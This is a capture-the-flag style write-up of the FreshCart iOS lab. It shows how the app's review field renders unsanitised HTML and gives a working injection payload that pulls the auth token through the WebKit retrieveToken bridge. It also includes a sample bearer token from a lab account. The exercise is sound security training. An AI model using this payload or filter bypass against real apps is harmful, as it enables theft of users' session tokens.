**Description**: Welcome to the **iOS Application Security Lab: JavaScript-to-Native Bridge Exploitation Challenge**. This challenge is centered around a fictitious grocery app called Freshcart. Freshcart contains a critical vulnerability that allows token stealing by exploiting the JavaScript to native bridge. Your objective is to exploit this vulnerability to steal the token used within the app.

**Download**: https://lautarovculic.com/my_files/freshcart.ipa
**Link:** https://www.mobilehackinglab.com/path-player?courseid=lab-freshcart

![[freshcart1.png]]

Install an **IPA** file can be difficult.
So, for make it more easy, I made a YouTube video with the process using **Sideloadly**.
**LINK**: https://www.youtube.com/watch?v=YPpo9owRKGE

**NOTE**: If you have problems with the keyboard and UI (buttons) when you need to hide it on a physical device, you can fix this problem by using the `KeyboardTools` by `@CrazyMind90` found in the Sileo app store.

Once you have the app installed, let's proceed with the challenge.
**unzip** the **`.ipa`** file.

But first, let's move into the app, knowing functionalities, possible attack points where we can abuse the JS.
After a simple research in the app, (and capturing all traffic with **burpsuite**), I notice that the vulnerable field is the **review description** in **each product**.

![[freshCart2.png]]

Notice that the title keep the data `<h1>lau</h1><h2>taro</h2>`
Meanwhile the content of the review is interpreted if we use the same 'payload'.

Here's the **request** that the app send to the server
```HTTP
POST /freshcart-api/products/1/review HTTP/2
Host: mhl.pages.dev
Content-Type: application/json
Accept: */*
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImxhdXRhcm9AbGF1dGFyby5jb20iLCJpYXQiOjE3Mzk3MTkwNTR9.DLi-DvcNQZkMXVi36mxLebZgP3-5LtlFKJZyslZtnhA
Sec-Fetch-Site: cross-site
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Mode: cors
Origin: http://192.168.1.90:8080
Content-Length: 74
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)
Referer: http://192.168.1.90:8080/
Sec-Fetch-Dest: empty

{
    "title": "<h1>lau</h1><h2>taro</h2>",
    "review": "<h1>lau</h1><h2>taro</h2>"
}
```

Now that we know where the payload for get the token is, we just need search *javascript* references in the code.
While the `unzip` command was extracting the `Payload` folder, I see another folder called `build`.

```bash
tree Payload/FreshCart.app/build
```

Output:
```bash
Payload/FreshCart.app/build
├── asset-manifest.json
├── favicon.ico
├── images
│   ├── apple.png
│   ├── banana.png
│   ├── broccoli.png
│   ├── butter.png
│   ├── cheese.png
│   ├── coffee.png
│   ├── egg.png
│   ├── grocery1.png
│   ├── grocery2.png
│   ├── grocery3.png
│   ├── juice.png
│   ├── mango.png
│   ├── milk.png
│   ├── onion.png
│   ├── orange.png
│   ├── pineapple.png
│   ├── potato.png
│   ├── softdrink.png
│   ├── tea.png
│   ├── tomato.png
│   └── yogurt.png
├── index.html
├── logo192.png
├── logo512.png
├── manifest.json
├── robots.txt
└── static
    ├── css
    │   ├── main.e6c13ad2.css
    │   └── main.e6c13ad2.css.map
    └── js
        ├── 453.0ee6c3d2.chunk.js
        ├── 453.0ee6c3d2.chunk.js.map
        ├── main.adf11907.js
        ├── main.adf11907.js.LICENSE.txt
        └── main.adf11907.js.map

5 directories, 35 files
```

Im interested in this file `main.adf11907.js` but it is unreadable.
So, I use https://beautifier.io
Take off the `.js` file out of `.app` folder
```bash
cp main.adf11907.js ../../../../../
```

Now we can upload the `.js` file into the webpage.
Then, if you upload the `.js` in the tool, you can copy -and then modify the file- or download a new copy of the javascript code.

I opened the file with **vscode** and, over *22000 lines are presents*.
Let's make some **search in the code** about tokens, and how app works with **reviews** implementation.

And here's the most important code:
```javascript
wo = (e, t) => {
    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.retrieveToken) {
        const n = r => {
            r.data && r.data.token ? e(r.data.token) : t();
            window.removeEventListener("message", n);
        };
        window.addEventListener("message", n);
        window.webkit.messageHandlers.retrieveToken.postMessage(null);
    } else {
        const n = localStorage.getItem("auth_token");
        n && "undefined" !== n && n != null || t();
        e(n);
    }
};

Ao = e => {
    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.storeToken) {
        const t = e => {
            e.data && e.data.token ? window.location.href = "/" : window.location.href = "/logout";
            window.removeEventListener("message", t);
        };
        window.addEventListener("message", t);
        window.webkit.messageHandlers.storeToken.postMessage(e);
    } else {
        localStorage.setItem("auth_token", e);
    }
};
```

This code is **handling authentication in an iOS WebView** using `window.webkit.messageHandlers`.
- `wo(e, t)` → Attempts **to get the user's token from `localStorage`** or through a **WebKit `messageHandler`** (`retrieveToken`).
- `Ao(e)` → **Store the user's token in `localStorage`** or **pass it to a WebKit `messageHandler`** (`storeToken`).

Let's interpret this code line by line
```javascript
// Function to retrieve the authentication token
wo = (successCallback, errorCallback) => {
    // Check if running inside an iOS WebView with a message handler for retrieving the token
    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.retrieveToken) {
        // Define a function to handle the response message
        const messageHandler = event => {
            // If the response contains a token, call the success callback
            if (event.data && event.data.token) {
                successCallback(event.data.token);
            } else {
                // Otherwise, call the error callback
                errorCallback();
            }
            // Remove the event listener after handling the message
            window.removeEventListener("message", messageHandler);
        };

        // Add an event listener to wait for the token response
        window.addEventListener("message", messageHandler);

        // Request the token from the native iOS app via WebKit
        window.webkit.messageHandlers.retrieveToken.postMessage(null);
    } else {
        // If running in a regular browser, try getting the token from localStorage
        const token = localStorage.getItem("auth_token");

        // If the token is invalid or missing, call the error callback
        if (!token || token === "undefined" || token === null) {
            errorCallback();
        } else {
            // Otherwise, call the success callback with the retrieved token
            successCallback(token);
        }
    }
};

// Function to store the authentication token
Ao = token => {
    // Check if running inside an iOS WebView with a message handler for storing the token
    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.storeToken) {
        // Define a function to handle the response message
        const messageHandler = event => {
            // If token storage was successful, redirect to the homepage
            if (event.data && event.data.token) {
                window.location.href = "/";
            } else {
                // Otherwise, redirect to the logout page
                window.location.href = "/logout";
            }
            // Remove the event listener after handling the message
            window.removeEventListener("message", messageHandler);
        };

        // Add an event listener to wait for the response
        window.addEventListener("message", messageHandler);

        // Send the token to the native iOS app for storage
        window.webkit.messageHandlers.storeToken.postMessage(token);
    } else {
        // If running in a regular browser, store the token in localStorage
        localStorage.setItem("auth_token", token);
    }
};
```

Also, we can see something interesting
```javascript
children: [
    (0, P.jsx)("h3", {
        children: e.title
    }),
    e.review.includes("<script>") ? 
        (0, P.jsx)("p", {
            children: e.review
        }) : 
        (0, P.jsx)("p", {
            dangerouslySetInnerHTML: {
                __html: e.review
            }
        })
]
```

This code:
- Renders a title (`h3`) with the value of `e.title`.
- If `e.review` contains `<script>`, render a `<p>` with children: `e.review` as **plain text** (i.e., *avoid executing injected HTML code*).
- If `e.review` **does NOT contain** `<script>`, use `dangerouslySetInnerHTML` to **render it as injected HTML**.

Since the **iOS WebView** uses `window.webkit.messageHandlers.retrieveToken.postMessage()`, we can have the page **inject** a `postMessage` to *exfiltrate the token*.

After 38 payloads, I can craft this with a **`Button`** and **`TextArea`**
```HTML
<textarea id=tokenField></textarea><button onclick=window.addEventListener('message',function(e){document.getElementById('tokenField').value='Token:'+e.data.token},false);window.webkit.messageHandlers.retrieveToken.postMessage(null);>Get Token</button>
```
*Note: You can use https://pastebin.com for copy & paste payloads -make it more easy, also, use BurpSuite repeater for test many payloads*

This code creates a `<textarea>` where the token will be displayed and a `<button>` that, when clicked, requests the token from the iOS WebView using `window.webkit.messageHandlers.retrieveToken.postMessage(null);`. It then listens for the message response with `window.addEventListener('message', ...)` and writes the token inside the `<textarea>`.

![[freshCart3.png]]

I hope you found it useful (: